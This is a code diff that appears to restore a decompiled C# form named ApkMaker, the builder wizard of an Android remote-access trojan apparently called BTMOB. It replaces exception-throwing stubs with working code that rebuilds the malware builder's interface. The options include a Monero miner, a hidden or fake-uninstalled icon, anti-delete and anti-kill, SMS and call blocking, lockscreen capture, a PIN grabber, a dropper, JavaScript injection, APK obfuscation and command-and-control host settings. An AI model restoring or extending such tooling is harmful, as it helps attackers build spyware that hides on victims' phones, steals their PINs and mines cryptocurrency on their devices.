@@ -1337,6 +1337,20 @@ public class ApkMaker : basestyle
 
 	private int currentStepIndex;
 
+	private Panel[] wizardPages;
+
+	private static readonly string[] WizardTitles = new string[8]
+	{
+		"Use app from BT Store ?",
+		"Your app information",
+		"What permissions the apk use",
+		"Request accessibility page",
+		"How the app should work?",
+		"Accessibility services options",
+		"Create custom signing keys",
+		"Ready ?"
+	};
+
 	private TagsManager TagsManager;
 
 	private HttpClient httpClient;
@@ -4576,14 +4590,494 @@ public class ApkMaker : basestyle
 	[DebuggerNonUserCode]
 	protected override void Dispose(bool disposing)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		base.Dispose(disposing);
 	}
 
 	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
 	[System.Diagnostics.DebuggerStepThrough]
 	private void InitializeComponent()
 	{
-		throw new System.AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		// Designer body was not recovered. This rebuilds the 8-step wizard
+		// from the original screenshots and the control order in the string table.
+		Text = "ApkMaker";
+		Size = new Size(1040, 700);
+		MinimumSize = new Size(900, 620);
+		StartPosition = FormStartPosition.CenterScreen;
+		BackColor = WizardBg;
+		ForeColor = Color.White;
+		CreateInputs();
+		wizardPages = new Panel[8]
+		{
+			PageStore(),
+			PageAppInfo(),
+			PagePermissions(),
+			PageAccess(),
+			PageOptions(),
+			PageAccessOptions(),
+			PageSigning(),
+			PageReady()
+		};
+		Panel host = new Panel { Dock = DockStyle.Fill, BackColor = WizardBg };
+		Panel footer = new Panel { Dock = DockStyle.Bottom, Height = 58, BackColor = WizardBg, Padding = new Padding(12, 8, 12, 8) };
+		backbtn = NavButton("<  Back");
+		backbtn.Dock = DockStyle.Left;
+		nextbtn = NavButton("Next  >");
+		nextbtn.Dock = DockStyle.Right;
+		footer.Controls.Add(backbtn);
+		footer.Controls.Add(nextbtn);
+		foreach (Panel page in wizardPages)
+		{
+			page.Dock = DockStyle.Fill;
+			page.Visible = false;
+			host.Controls.Add(page);
+		}
+		Controls.Add(host);
+		Controls.Add(footer);
+		footer.BringToFront();
+		if (Panel1 != null)
+			Panel1.BringToFront();
+		if (mytitle != null)
+		{
+			mytitle.ForeColor = WizardAccent;
+			mytitle.Font = new Font(mytitle.Font.FontFamily, 11f, FontStyle.Bold);
+		}
+		ShowWizardStep(0);
+	}
+
+	private void ShowWizardStep(int index)
+	{
+		if (wizardPages == null || index < 0 || index >= wizardPages.Length)
+			return;
+		currentStepIndex = index;
+		for (int i = 0; i < wizardPages.Length; i++)
+			wizardPages[i].Visible = i == index;
+		if (mytitle != null)
+			mytitle.Text = (index + 1) + "/8 | " + WizardTitles[index];
+		if (backbtn != null)
+			backbtn.Enabled = index > 0;
+		if (nextbtn != null)
+			nextbtn.Text = index == wizardPages.Length - 1 ? "Build" : "Next  >";
+	}
+
+	private void CreateInputs()
+	{
+		appname = Box("App 1");
+		CLiname = Box("Client1");
+		applink = Box("mysite.com");
+		titletext = Box("");
+		msgtext = Box("");
+		appver = Box("1.0.0", 180);
+		appids = Box("com.example.app", 220);
+		connectionkey = Box("BTMOB", 220);
+		inputhost = Box("example.home.ftp", 220);
+		clitag = Box("", 220);
+		Acctitletext = Box("");
+		Accmsgtext = Box("");
+		Accbtntext = Box("");
+		steptxt = Box("", 220);
+		adminpass = Box("");
+		namemonitor = Box("");
+		linkmonitor = Box("");
+		idmonitor = Box("");
+		dropname = Box("");
+		dropver = Box("");
+		dropid = Box("");
+		droptitle = Box("");
+		dropmsg = Box("");
+		txtAliasName = Box("");
+		txtPassword = Box("");
+		txtCN = Box("");
+		txtOU = Box("");
+		txtO = Box("");
+		txtL = Box("");
+		txtS = Box("");
+		txtC = Box("");
+		jectjstext = new DrakeUIRichTextBox
+		{
+			Text = "//Example:\r\n\r\nif(confirm('Join telegram channel')){\r\n    window.open('https://t.me/test','_blank');\r\n}",
+			Dock = DockStyle.Fill,
+			ForeColor = Color.FromArgb(170, 210, 205),
+			FillColor = Color.FromArgb(8, 16, 28)
+		};
+		checknosleep = Check("Prevent sleep mode");
+		checknoemu = Check("Anti-emulator");
+		checkantistop = Check("Anti-Kill");
+		checkforceprims = Check("Force permissions");
+		blocksms = Check("Block SMS", Color.OrangeRed);
+		blockcalls = Check("Block Calls", Color.OrangeRed);
+		Devadmincheck = Check("Device admin");
+		checkreqadmin = Check("Request on start");
+		rootcheck = Check("Root detect");
+		checkxmr = Check("XMR miner.", Color.OrangeRed);
+		checkffmpg = Check("FFmpeg library");
+		checknotykill = Check("Stop-notification kill");
+		checkfakewifi = Check("Fake WI-FI icon");
+		checkprotect = Check("Anti-decompile");
+		checkdexp = Check("DEX-Protector");
+		encryptmain = Check("Encrypt APK");
+		checkpump = Check("Pump size", Color.OrangeRed);
+		checkjctjs = Check("inject Javascript");
+		checkonejs = Check("one time");
+		checkhidprim = Check("Hide Permissions");
+		checkdisstore = Check("Disable Google store");
+		checkreplcply = Check("Replace google play");
+		checkNoservice = Check("Service not available");
+		checkantidelete = Check("Anti-Delete");
+		checkcaplock = Check("Capture lockscreen");
+		checkautoprims = Check("Auto Permissions");
+		checkhidnotify = Check("Hide notifications");
+		checkstore = new DrakeUIOSSwitch();
+		checkplugin = new DrakeUIOSSwitch();
+		checkaccsspage = new DrakeUIOSSwitch();
+		checkcustmsign = new DrakeUIOSSwitch();
+		langtext = Combo("English", "العربية", "中国人", "Русский", "Türkçe", "Español", "Português");
+		hideicocombox = Combo("No Hide", "Fake uninstall", "Complete hide", "Fake icon");
+		comboacctype = Combo("1 Guid", "2 Dropper");
+		combodroptype = Combo("Google play", "Plugin");
+		comboTargts = Combo("Tracker", "Pin Grabber");
+		listhosts = List();
+		ListTags = List();
+		ListTags.Items.Add("lab");
+		LastSelectedTag = "lab";
+		Listhides = List();
+		stepslist = List();
+		traklist = List();
+		listshortcuts = List();
+		listshortcuts.Items.AddRange(new object[] { "SIM Card", "Wallpaper Shortcut" });
+		hideicocombox.SelectedIndex = 2;
+		listshortcuts.Enabled = false;
+		appicoimg = new PictureBox { Size = new Size(48, 48), BackColor = Color.FromArgb(12, 24, 36), Tag = "icon" };
+		dropimg = new PictureBox { Size = new Size(48, 48), BackColor = Color.FromArgb(12, 24, 36) };
+		listicons = new ListView { Height = 72, Dock = DockStyle.Bottom, BackColor = Color.FromArgb(8, 16, 28), ForeColor = WizardAccent, BorderStyle = BorderStyle.None };
+		DGVSTORBLD = Grid();
+		DGVSTORBLD.Columns.Add("icon", "");
+		DGVSTORBLD.Columns.Add("name", "App-name");
+		DGVSTORBLD.Columns.Add("id", "App-ID");
+		DGVSTORBLD.Columns.Add("date", "App-Date");
+		DGVSTORBLD.Columns.Add("size", "App-Size");
+		DGVSTORBLD.Columns.Add("ver", "Version");
+		DGVSTORBLD.Columns.Add("state", "State");
+		DGVKEYS = Grid();
+		DGVKEYS.Columns.Add("alias", "Alias name");
+		DGVKEYS.Columns.Add("cn", "Common name");
+		DGVKEYS.Columns.Add("country", "Country");
+		DGVKEYS.Columns.Add("date", "Date");
+		BuildPermissionGrid();
+	}
+
+	private void BuildPermissionGrid()
+	{
+		DGVPRIMB = Grid();
+		DGVPRIMB.RowHeadersVisible = false;
+		DGVPRIMB.AllowUserToAddRows = false;
+		DGVPRIMB.Columns.Add("n", "");
+		DGVPRIMB.Columns.Add("perm", "Permission");
+		DataGridViewComboBoxColumn action = new DataGridViewComboBoxColumn
+		{
+			Name = "action",
+			HeaderText = "Action",
+			FlatStyle = FlatStyle.Flat
+		};
+		action.Items.AddRange("Add", "Remove");
+		DGVPRIMB.Columns.Add(action);
+		DGVPRIMB.Columns.Add(new DataGridViewCheckBoxColumn { Name = "onstart", HeaderText = "Request OnStart" });
+		DGVPRIMB.Columns.Add("ico", "");
+		DGVPRIMB.Columns[0].Width = 36;
+		DGVPRIMB.Columns[2].Width = 110;
+		DGVPRIMB.Columns[3].Width = 130;
+		DGVPRIMB.Columns[4].Width = 36;
+		string[] names = new string[16]
+		{
+			BTConst.accserstr, BTConst.usgapstr, BTConst.draovrstr, BTConst.chngstnstr,
+			BTConst.btryopimstr, BTConst.backdatastr, BTConst.filaccstr, BTConst.camaccstr,
+			BTConst.micaccstr, BTConst.redsmsstr, BTConst.sndsmstr, BTConst.redconstr,
+			BTConst.redactstr, BTConst.noftsstr, BTConst.loctionstr, BTConst.callfordstr
+		};
+		string[] actions = new string[16]
+		{
+			"Remove", "Add", "Add", "Remove", "Remove", "Add", "Add", "Add",
+			"Add", "Add", "Remove", "Add", "Remove", "Remove", "Remove", "Add"
+		};
+		bool[] onStart = new bool[16]
+		{
+			false, true, true, false, false, true, true, true,
+			true, true, false, true, false, false, false, true
+		};
+		for (int i = 0; i < names.Length; i++)
+		{
+			int row = DGVPRIMB.Rows.Add((i + 1).ToString(), names[i], actions[i], onStart[i], null);
+			if (i == 3 || i == 12)
+				DGVPRIMB.Rows[row].Visible = false;
+		}
+	}
+
+	private Panel PageStore()
+	{
+		Panel page = Page();
+		Label title = Heading("Select from store");
+		title.Dock = DockStyle.Top;
+		checkstore.Dock = DockStyle.Top;
+		checkstore.Height = 28;
+		DGVSTORBLD.Dock = DockStyle.Fill;
+		page.Controls.Add(DGVSTORBLD);
+		page.Controls.Add(checkstore);
+		page.Controls.Add(title);
+		return page;
+	}
+
+	private Panel PageAppInfo()
+	{
+		Panel page = Page();
+		FlowLayoutPanel flow = new FlowLayoutPanel { Dock = DockStyle.Fill, FlowDirection = FlowDirection.TopDown, WrapContents = false, AutoScroll = true };
+		flow.Controls.Add(FieldRow("Client Name", CLiname));
+		flow.Controls.Add(FieldRow("App Name", appname));
+		flow.Controls.Add(FieldRow("App URL", applink));
+		flow.Controls.Add(FieldRow("Notification Title", titletext));
+		flow.Controls.Add(FieldRow("Notification Message", msgtext));
+		flow.Controls.Add(FieldRow("App Version", appver));
+		flow.Controls.Add(FieldRow("Packagename", appids));
+		flow.Controls.Add(FieldRow("App icon", appicoimg));
+		flow.Controls.Add(listicons);
+		page.Controls.Add(flow);
+		return page;
+	}
+
+	private Panel PagePermissions()
+	{
+		Panel page = Page();
+		DGVPRIMB.Dock = DockStyle.Fill;
+		page.Controls.Add(DGVPRIMB);
+		return page;
+	}
+
+	private Panel PageAccess()
+	{
+		Panel page = Page();
+		FlowLayoutPanel flow = new FlowLayoutPanel { Dock = DockStyle.Fill, FlowDirection = FlowDirection.TopDown, WrapContents = false, AutoScroll = true };
+		flow.Controls.Add(Heading("Request accessibility page"));
+		flow.Controls.Add(FieldRow("Select Language", langtext));
+		flow.Controls.Add(FieldRow("Title text", Acctitletext));
+		flow.Controls.Add(FieldRow("Message", Accmsgtext));
+		flow.Controls.Add(FieldRow("Button text", Accbtntext));
+		flow.Controls.Add(FieldRow("Guide steps", steptxt));
+		stepslist.Width = 420;
+		stepslist.Height = 140;
+		flow.Controls.Add(stepslist);
+		page.Controls.Add(flow);
+		return page;
+	}
+
+	private Panel PageOptions()
+	{
+		Panel page = Page();
+		TableLayoutPanel table = new TableLayoutPanel { Dock = DockStyle.Fill, ColumnCount = 2, RowCount = 1 };
+		table.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 38f));
+		table.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 62f));
+		FlowLayoutPanel options = new FlowLayoutPanel { Dock = DockStyle.Fill, FlowDirection = FlowDirection.TopDown, WrapContents = false, AutoScroll = true };
+		options.Controls.Add(Heading("Options"));
+		options.Controls.AddRange(new Control[] { checknosleep, checknoemu, checkantistop, checkforceprims, blocksms, blockcalls, Devadmincheck, checkreqadmin, adminpass, rootcheck, checkxmr, checkffmpg, checknotykill, Heading("Hide icon"), hideicocombox, listshortcuts });
+		listshortcuts.Width = 280;
+		listshortcuts.Height = 64;
+		FlowLayoutPanel tracking = new FlowLayoutPanel { Dock = DockStyle.Fill, FlowDirection = FlowDirection.TopDown, WrapContents = false, AutoScroll = true, Padding = new Padding(12, 0, 0, 0) };
+		tracking.Controls.Add(Heading("Tracking"));
+		tracking.Controls.Add(FieldRow("Name", namemonitor));
+		tracking.Controls.Add(FieldRow("link", linkmonitor));
+		tracking.Controls.Add(FieldRow("Package name", idmonitor));
+		tracking.Controls.Add(comboTargts);
+		traklist.Width = 520;
+		traklist.Height = 220;
+		tracking.Controls.Add(traklist);
+		table.Controls.Add(options, 0, 0);
+		table.Controls.Add(tracking, 1, 0);
+		page.Controls.Add(table);
+		return page;
+	}
+
+	private Panel PageAccessOptions()
+	{
+		Panel page = Page();
+		FlowLayoutPanel flow = new FlowLayoutPanel { Dock = DockStyle.Fill, FlowDirection = FlowDirection.TopDown, WrapContents = false, AutoScroll = true };
+		flow.Controls.Add(Heading("Accessibility services options"));
+		flow.Controls.AddRange(new Control[] { checkantidelete, checkautoprims, checkhidprim, checkcaplock, checkhidnotify, checkdisstore, checkreplcply, checkNoservice, Heading("Install type"), comboacctype, Heading("Dropper info"), combodroptype, dropname, dropver, dropid, droptitle, dropmsg });
+		page.Controls.Add(flow);
+		return page;
+	}
+
+	private Panel PageSigning()
+	{
+		Panel page = Page();
+		FlowLayoutPanel flow = new FlowLayoutPanel { Dock = DockStyle.Fill, FlowDirection = FlowDirection.TopDown, WrapContents = false, AutoScroll = true };
+		flow.Controls.Add(Heading("Create custom signing keys"));
+		flow.Controls.Add(FieldRow("Alias Name", txtAliasName));
+		flow.Controls.Add(FieldRow("Password", txtPassword));
+		flow.Controls.Add(FieldRow("Common Name", txtCN));
+		flow.Controls.Add(FieldRow("Organizational Unit", txtOU));
+		flow.Controls.Add(FieldRow("Organization", txtO));
+		flow.Controls.Add(FieldRow("Locality", txtL));
+		flow.Controls.Add(FieldRow("State", txtS));
+		flow.Controls.Add(FieldRow("Country Code", txtC));
+		DGVKEYS.Width = 860;
+		DGVKEYS.Height = 140;
+		flow.Controls.Add(DGVKEYS);
+		page.Controls.Add(flow);
+		return page;
+	}
+
+	private Panel PageReady()
+	{
+		Panel page = Page();
+		TableLayoutPanel table = new TableLayoutPanel { Dock = DockStyle.Fill, ColumnCount = 3, RowCount = 1 };
+		table.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 33f));
+		table.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 33f));
+		table.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 34f));
+		FlowLayoutPanel hosts = new FlowLayoutPanel { Dock = DockStyle.Fill, FlowDirection = FlowDirection.TopDown, WrapContents = false };
+		hosts.Controls.Add(Heading("Connection key"));
+		hosts.Controls.Add(connectionkey);
+		hosts.Controls.Add(Heading("Hostname (optional)"));
+		hosts.Controls.Add(inputhost);
+		DrakeUIButtonIcon2 = SmallButton("+");
+		DrakeUIButtonIcon3 = SmallButton("−");
+		FlowLayoutPanel hostButtons = new FlowLayoutPanel { Width = 120, Height = 32, FlowDirection = FlowDirection.LeftToRight };
+		hostButtons.Controls.Add(DrakeUIButtonIcon3);
+		hostButtons.Controls.Add(DrakeUIButtonIcon2);
+		hosts.Controls.Add(hostButtons);
+		listhosts.Width = 280;
+		listhosts.Height = 280;
+		hosts.Controls.Add(listhosts);
+		FlowLayoutPanel extra = new FlowLayoutPanel { Dock = DockStyle.Fill, FlowDirection = FlowDirection.TopDown, WrapContents = false, Padding = new Padding(8, 0, 0, 0) };
+		extra.Controls.Add(Heading("Extra"));
+		extra.Controls.AddRange(new Control[] { checkprotect, checkdexp, encryptmain, checkpump, Heading("App tag"), clitag });
+		DrakeUIButtonIcon5 = SmallButton("+");
+		DrakeUIButtonIcon4 = SmallButton("−");
+		FlowLayoutPanel tagButtons = new FlowLayoutPanel { Width = 120, Height = 32 };
+		tagButtons.Controls.Add(DrakeUIButtonIcon4);
+		tagButtons.Controls.Add(DrakeUIButtonIcon5);
+		extra.Controls.Add(tagButtons);
+		ListTags.Width = 280;
+		ListTags.Height = 220;
+		extra.Controls.Add(ListTags);
+		FlowLayoutPanel script = new FlowLayoutPanel { Dock = DockStyle.Fill, FlowDirection = FlowDirection.TopDown, WrapContents = false, Padding = new Padding(8, 0, 0, 0) };
+		script.Controls.Add(Heading("On start"));
+		script.Controls.Add(checkjctjs);
+		jectjstext.Width = 300;
+		jectjstext.Height = 360;
+		script.Controls.Add(jectjstext);
+		table.Controls.Add(hosts, 0, 0);
+		table.Controls.Add(extra, 1, 0);
+		table.Controls.Add(script, 2, 0);
+		page.Controls.Add(table);
+		return page;
+	}
+
+	private static readonly Color WizardBg = Color.FromArgb(6, 10, 18);
+
+	private static readonly Color WizardAccent = Color.FromArgb(0, 214, 168);
+
+	private Panel Page()
+	{
+		return new Panel { BackColor = WizardBg, Padding = new Padding(16, 8, 16, 4) };
+	}
+
+	private Label Heading(string text)
+	{
+		return new Label { Text = text, AutoSize = true, ForeColor = Color.White, Font = new Font("Segoe UI", 11f, FontStyle.Bold), Margin = new Padding(0, 8, 0, 6) };
+	}
+
+	private Panel FieldRow(string caption, Control editor)
+	{
+		Panel row = new Panel { Width = 640, Height = 34, Margin = new Padding(0, 3, 0, 3) };
+		Label captionLabel = new Label { Text = caption, Dock = DockStyle.Left, Width = 230, ForeColor = WizardAccent, TextAlign = ContentAlignment.MiddleLeft };
+		editor.Dock = DockStyle.Fill;
+		row.Controls.Add(editor);
+		row.Controls.Add(captionLabel);
+		return row;
+	}
+
+	private DrakeUIButtonIcon NavButton(string text)
+	{
+		return new DrakeUIButtonIcon
+		{
+			Text = text,
+			Width = 130,
+			Height = 36,
+			ForeColor = WizardAccent,
+			FillColor = Color.FromArgb(10, 18, 28),
+			RectColor = Color.FromArgb(0, 90, 70)
+		};
+	}
+
+	private DrakeUIButtonIcon SmallButton(string text)
+	{
+		return new DrakeUIButtonIcon
+		{
+			Text = text,
+			Width = 36,
+			Height = 28,
+			ForeColor = WizardAccent,
+			FillColor = Color.FromArgb(10, 18, 28)
+		};
+	}
+
+	private static DrakeUITextBox Box(string text, int width = 280)
+	{
+		return new DrakeUITextBox
+		{
+			Text = text,
+			Width = width,
+			ForeColor = Color.FromArgb(190, 220, 225),
+			FillColor = Color.FromArgb(14, 26, 40),
+			RectColor = Color.FromArgb(28, 48, 64)
+		};
+	}
+
+	private static DrakeUICheckBox Check(string text)
+	{
+		return Check(text, Color.FromArgb(0, 214, 168));
+	}
+
+	private static DrakeUICheckBox Check(string text, Color color)
+	{
+		return new DrakeUICheckBox { Text = text, Checked = false, ForeColor = color, Width = 260, Height = 26 };
+	}
+
+	private static DrakeUIComboBox Combo(params string[] items)
+	{
+		DrakeUIComboBox box = new DrakeUIComboBox { Width = 260 };
+		box.Items.AddRange(items);
+		if (box.Items.Count > 0)
+			box.SelectedIndex = 0;
+		return box;
+	}
+
+	private static ListBox List()
+	{
+		return new ListBox
+		{
+			BackColor = Color.FromArgb(8, 18, 32),
+			ForeColor = Color.White,
+			BorderStyle = BorderStyle.FixedSingle
+		};
+	}
+
+	private static DataGridView Grid()
+	{
+		DataGridView grid = new DataGridView
+		{
+			BackgroundColor = Color.FromArgb(6, 10, 18),
+			GridColor = Color.FromArgb(16, 32, 44),
+			BorderStyle = BorderStyle.None,
+			EnableHeadersVisualStyles = false,
+			RowHeadersVisible = false,
+			AllowUserToAddRows = false,
+			SelectionMode = DataGridViewSelectionMode.FullRowSelect
+		};
+		grid.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(8, 16, 26);
+		grid.ColumnHeadersDefaultCellStyle.ForeColor = Color.FromArgb(0, 214, 168);
+		grid.DefaultCellStyle.BackColor = Color.FromArgb(6, 10, 18);
+		grid.DefaultCellStyle.ForeColor = Color.FromArgb(0, 214, 168);
+		grid.DefaultCellStyle.SelectionBackColor = Color.FromArgb(14, 36, 48);
+		grid.DefaultCellStyle.SelectionForeColor = Color.White;
+		return grid;
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
@@ -4601,19 +5095,29 @@ public class ApkMaker : basestyle
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	protected override void OnFormClosed(FormClosedEventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		base.OnFormClosed(e);
 	}
 
-	[MethodImpl(MethodImplOptions.NoInlining)]
 	public ApkMaker(string nk, HttpClient htpcli, string ip, string conkey, HttpClient dhtpcli)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		nextkey = nk;
+		httpClient = htpcli;
+		DownloadhttpClient = dhtpcli;
+		serverip = ip;
+		InitializeComponent();
+		if (!codes.StrisEmpty(conkey))
+			connectionkey.Text = conkey;
+		if (!codes.StrisEmpty(ip) && !listhosts.Items.Contains(ip))
+			listhosts.Items.Add(ip);
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	private void nextbtn_Click(object sender, EventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		if (wizardPages != null && currentStepIndex < wizardPages.Length - 1)
+			ShowWizardStep(currentStepIndex + 1);
+		else
+			startbuilder();
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
@@ -4633,7 +5137,8 @@ public class ApkMaker : basestyle
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	private void backbtn_Click(object sender, EventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		if (currentStepIndex > 0)
+			ShowWizardStep(currentStepIndex - 1);
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
@@ -4689,13 +5194,13 @@ public class ApkMaker : basestyle
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	private void DGVPRIMS_CellValueChanged(object sender, DataGridViewCellEventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	private void DGVPRIMS_CurrentCellDirtyStateChanged(object sender, EventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		if (DGVPRIMB != null && DGVPRIMB.IsCurrentCellDirty)
+			DGVPRIMB.CommitEdit(DataGridViewDataErrorContexts.Commit);
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
@@ -4751,7 +5256,7 @@ public class ApkMaker : basestyle
 	[DebuggerStepThrough]
 	private void builderworker_DoWork(object sender, DoWorkEventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		startbuilder();
 	}
 
 	private void startbuilder()
@@ -5455,13 +5960,16 @@ public class ApkMaker : basestyle
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		string host = inputhost.Text == null ? "" : inputhost.Text.Trim();
+		if (!codes.StrisEmpty(host) && !listhosts.Items.Contains(host))
+			listhosts.Items.Add(host);
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		if (listhosts.SelectedItem != null)
+			listhosts.Items.Remove(listhosts.SelectedItem);
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
@@ -5479,19 +5987,30 @@ public class ApkMaker : basestyle
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		string tag = clitag.Text == null ? "" : clitag.Text.Trim();
+		if (codes.StrisEmpty(tag) || ListTags.Items.Contains(tag))
+			return;
+		ListTags.Items.Add(tag);
+		LastSelectedTag = tag;
+		ListTags.SelectedItem = tag;
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		if (ListTags.SelectedItem == null)
+			return;
+		string removed = ListTags.SelectedItem.ToString();
+		ListTags.Items.Remove(ListTags.SelectedItem);
+		if (LastSelectedTag == removed)
+			LastSelectedTag = ListTags.Items.Count > 0 ? ListTags.Items[0].ToString() : "";
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	private void ListTags_SelectedIndexChanged(object sender, EventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		if (ListTags.SelectedItem != null)
+			LastSelectedTag = ListTags.SelectedItem.ToString();
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
@@ -5521,13 +6040,11 @@ public class ApkMaker : basestyle
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	private void DGVPRIMB_CellClick(object sender, DataGridViewCellEventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	private void DGVPRIMB_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
@@ -5587,7 +6104,11 @@ public class ApkMaker : basestyle
 	[MethodImpl(MethodImplOptions.NoInlining)]
 	private void hideicocombox_SelectedIndexChanged(object sender, EventArgs e)
 	{
-		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
+		if (listshortcuts == null || checkfakewifi == null || hideicocombox == null)
+			return;
+		listshortcuts.Enabled = hideicocombox.SelectedIndex == 3;
+		checkfakewifi.Enabled = hideicocombox.SelectedIndex == 1;
+		checkfakewifi.Visible = hideicocombox.SelectedIndex == 1;
 	}
 
 	[MethodImpl(MethodImplOptions.NoInlining)]
